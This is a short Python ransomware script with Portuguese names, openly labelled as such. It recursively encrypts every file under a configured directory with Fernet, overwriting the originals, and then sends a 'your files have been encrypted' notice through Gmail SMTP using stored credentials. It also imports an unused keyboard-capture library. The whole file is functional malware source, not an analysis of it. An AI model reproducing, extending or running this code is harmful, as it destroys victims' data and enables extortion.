from cryptography.fernet import Fernet
import os
import configparser
from pynput import keyboard
import smtplib
from email.mime.text import MIMEText

config = configparser.ConfigParser()
config.read(".properties")
PATH_FILE = config["ransoware"]["PATH"]

def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

def carregar_chave():
    return open("chave.key", "rb").read()

def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, 'rb') as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo,'wb') as file:
        file.write(dados_encriptados)
    
def encontrar_arquivos(diretorio):
    lista = []
    for raiz,_, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

def criar_mensagem_resgate():
    EMAIL_ORIGEM = config["acessos"]["EMAIL_ORIGEM"]
    EMAIL_DESTINO = config["acessos"]["EMAIL_DESTINO"]
    SENHA_EMAIL = config["acessos"]["SENHA_EMAIL"]
    texto = "Seus arquivos foram criptografados!"
    if texto:
        msg = MIMEText(texto)
        msg['SUBJECT'] = "Importante!"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO
        
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print(f"Erro ao enviar {e}")
        log = ""

def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos(PATH_FILE)
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransoware executado! Arquivos criptografos!")

if __name__ =="__main__":
    main()